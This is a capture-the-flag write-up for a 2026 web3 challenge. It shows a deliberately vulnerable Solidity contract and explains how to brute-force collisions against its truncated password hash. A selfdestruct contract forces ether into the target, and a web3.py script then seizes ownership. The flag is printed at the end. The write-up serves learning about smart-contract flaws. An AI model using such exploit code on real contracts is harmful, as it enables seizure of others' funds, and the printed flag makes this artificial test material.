# Administration Console

Exploiting hash collision and selfDestruct to change the owner of this Solidity contract

**Event**: Hackday Quals 2026

**Category**: web3

**Difficulty**: easy

**Points**: 100

**Solves**: 134

---

## Challenge description
Our team made it to a shady room with a dusty computer and a keyboard. It seems to be the mainframe to control the ledger (weird for a decentralized network...).
> IP:port

**Administration.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract AdministrationConsole {
	
	address public owner;
	mapping(bytes32 => bool) public usedPasswords;

	event OwnerChanged(address oldOwner, address newOwner);

	constructor() payable {
		require(msg.value == 1 ether, "Not enough ethers to deploy");
	}
	
	modifier costETH() {
		(bool sent, bytes memory data) = address(0).call{value: 1 ether}("");
		require(sent == true, "Failed to send ethers");
		_;
	}

	function revokeOwnership(bytes32 password) public costETH {
		require(usedPasswords[password] == false, "Owner already changed");
		require(_SaltedHash(password) == 0x311299, "Wrong password");
		
		usedPasswords[password] = true;

		emit OwnerChanged(owner, address(0));
		owner = address(0);
	}
	
	function changeOwner(bytes32 password) public costETH {
		require(owner == address(0), "Someone is already the owner");
		require(usedPasswords[password] == false, "Owner already changed");
		require(_SaltedHash(password) == 0x311299, "Wrong password");

		emit OwnerChanged(owner, msg.sender);
		owner = msg.sender;
		usedPasswords[password] = true;
	}
	
	function getOwner() public view returns (address) {
		return owner;
	}

	function isUsedPassword(bytes32 password) public view returns (bool) {
		return usedPasswords[password];
	}

	function _SaltedHash(bytes32 input) internal pure returns (uint val) {
		bytes32 header;

		assembly {
			header := hex"313939396275676174323030307475726e30666662346d69646e696768742121"
			let _ptr := mload(0x40)
			mstore(_ptr, header)
			mstore(add(_ptr, 32), input)
			let _hash := keccak256(_ptr, 64)
			val := and(_hash, 0xffffff)
		}
	}
}
```

**Setup.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;
import {AdministrationConsole} from "./Administration.sol";


contract Setup {
	address public player;

	AdministrationConsole public adminContract;
	constructor (address _player) payable {
		require(msg.value == 1 ether, "Not enough ether to deploy the contract");
		player = _player;
		adminContract = new AdministrationConsole{value: 1 ether}();
		adminContract.changeOwner(0x2af97beb37ab8ae9e39839c864b657b567d1b63f9c005506ad2aaa5d454fa875);
	}

	function isSolved() public view returns (bool) {
		address owner = adminContract.owner();
		return owner != address(0) && owner != address(this);
	}
}
```

---

## Setup
Calling `nc IP port` gives us 3 options: start an instance, kill an instance and get flag. After starting an instance, we write the given details into environment variables as such:
```bash
export UUID           =  some-hex-string
export RPC            =  http://IP:PORT/UUID
export PRIVATE_KEY    =  32-byte-address
export PLAYER_ADDRESS =  20-byte-address
export CHALLENGE      =  20-byte-address
```

---

## Understand the contract
Let's start from the ending: When is the challenge solved?

When the owner of the contract is neither Setup.sol nor  address(0).

Setup instantiates an AdministrationConsole, gives it 1 ether and calls `changeOwner()` on some hardcoded password.

`changeOwner()` sets the owner of AdministrationConsole to be the caller of the function, **IF** the password is correct, unused and the account has no owner. Additionally, the AdministrationConsole has to first send 1 ether to address(0) because of the `costETH` modifier.

The first problem here is that  `AdministrationConsole`  doesn't provide us with a method to pay it and it already consumed the one ether it had by calling `changeOwner()` in Setup.sol. But we'll see later how to bypass that...


`revokeOwnership()` is similar to `changeOwner()`, except it only needs an unused, correct password to change the owner of AdministrationConsole to address(0).
So, we need to first call this function to set the owner to address(0), and then change the owner from address(0) to our own.


What is a correct password?

Looking at `_SaltedHash()`, we notice that the password is checked as follows:
- prepend a hex string to input password (32 bytes + 32 bytes)
- compute hash for all 64 bytes (salted password)
- salted hashed password AND 0xffffff => truncate last 3 (least significant) bytes
- check the result is `0x311299`

We will need to find 2 hash collisions, 2 distinct passwords for calling both `revokeOwnership()` and `changeOwner()`


The trick to give AdministrationConsole some ether is to make another contract that calls `selfdestruct(AdministrationConsole)`.  AdminConsole is payable and doesn't implement a guard against this, so even if we can't directly pay it, we can pay our SelfDestructor contract and make it self destruct, sending the money to AdministrationConsole. 

---

## Solve the challenge
First, we find 2 hash collisions on the password, statically:
```python
from Crypto.Hash import keccak

header = bytes.fromhex("313939396275676174323030307475726e30666662346d69646e696768742121")
target = 0x311299

n = 0
results = 0

while results < 2:
    n_bytes = n.to_bytes(32)
    
    k = keccak.new(digest_bits=256)
    k.update(header + n_bytes)
    hash_result = k.digest()
    
    last_3_bytes = int.from_bytes(hash_result[-3:]) & 0xffffff
    
    if last_3_bytes == target:
        results +=1
        print(f"Collision {results}: 0x{n_bytes.hex()}")
    
    n += 1
```

Then, we deploy our **SelfDestructor.sol**:
```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestructor {
    constructor() payable {}
    
    function destroy(address payable target) public {
        selfdestruct(target);
    }
    
    receive() external payable {}
}
```

Compile it:
```bash
sudo snap install solc --edge
solc --bin SelfDestructor.sol
```

Finally, solve the challenge.
Set up a connection with the environment variables:
```python
import os
from web3 import Web3
from eth_account import Account

UUID = os.getenv('UUID')
RPC = os.getenv('RPC')
PRIVATE_KEY = os.getenv('PRIVATE_KEY')
PLAYER_ADDRESS = os.getenv('PLAYER_ADDRESS')
SETUP_ADDRESS = os.getenv('SETUP_ADDRESS')
ADMIN_ADDRESS = os.getenv('CHALLENGE')

w3 = Web3(Web3.HTTPProvider(RPC))
account = Account.from_key(PRIVATE_KEY)

# Insert contract ABIs here

# Selfdestruct contract ABI
SELFDESTRUCT_ABI = [
    {
        "inputs": [{"internalType": "address", "name": "target", "type": "address"}],
        "name": "destroy",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

setup_contract = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
admin_contract = w3.eth.contract(address=ADMIN_ADDRESS, abi=ADMIN_ABI)
```

Helper functions:
``` python
def deploy_selfdestruct_contract():
    bytecode = "608060..." # paste the bytecode compiled earlier
    print("Selfdestruct with 2 ETH...")
    
    tx = {
        'from': PLAYER_ADDRESS,
        'data': bytecode,
        'value': w3.to_wei(2, 'ether'),
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'gas': 500000,
        'gasPrice': w3.eth.gas_price
    }
    
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Deploy tx: {tx_hash.hex()}")
    
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    contract_address = receipt.contractAddress
    print(f"Selfdestruct address: {contract_address}")
    print(f"Status: {receipt.status}")
    
    return contract_address


def trigger_selfdestruct(selfdestruct_contract_address):
    if selfdestruct_contract_address is None:
        print("No contract")
        return
    
    selfdestruct_contract = w3.eth.contract(
        address=selfdestruct_contract_address,
        abi=SELFDESTRUCT_ABI
    )
    
    tx = selfdestruct_contract.functions.destroy(ADMIN_ADDRESS).build_transaction({
        'from': PLAYER_ADDRESS,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"Selfdestruct tx: {tx_hash.hex()}")
    
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Status: {receipt.status}")
    
    # Check admin contract balance
    balance = w3.eth.get_balance(ADMIN_ADDRESS)
    print(f"Admin contract balance: {w3.from_wei(balance, 'ether')}")

def claim_ownership():
    print("Revoke ownership")
    password1 = "0x..." # first collision
    
    tx = admin_contract.functions.revokeOwnership(password1).build_transaction({
        'from': PLAYER_ADDRESS,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'gas': 300000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Revoke tx: {tx_hash.hex()}")
    print(f"Status: {receipt.status}")
    
    print("Claim ownership")
    password2 = "0x..."  # second collision
    
    tx = admin_contract.functions.changeOwner(password2).build_transaction({
        'from': PLAYER_ADDRESS,
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'gas': 300000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Change owner tx: {tx_hash.hex()}")
    print(f"Status: {receipt.status}")

def read_contract_state():
    owner = admin_contract.functions.getOwner().call()
    print(f"Owner: {owner}")
    
    solved = setup_contract.functions.isSolved().call()
    print(f"Is Solved: {solved}")
    
    balance = w3.eth.get_balance(ADMIN_ADDRESS)
    print(f"Admin Balance: {w3.from_wei(balance, 'ether')} ETH")
```

Deploy contract, self destruct and see the status of the challenge:
```python
if __name__ == "__main__":
    selfdestruct_addr = deploy_selfdestruct_contract()
    
    if selfdestruct_addr:
        trigger_selfdestruct(selfdestruct_addr)
        claim_ownership()
        
        read_contract_state()
    else:
        print("Don't forget to paste the compiled bytecode!")
```

### Get the flag
Congratulations! You have solved it! Here's the flag:

`HACKDAY{ef19d2c1c5397df215e53394fcb83973865ebfbb44905a782511d06b131ba250}`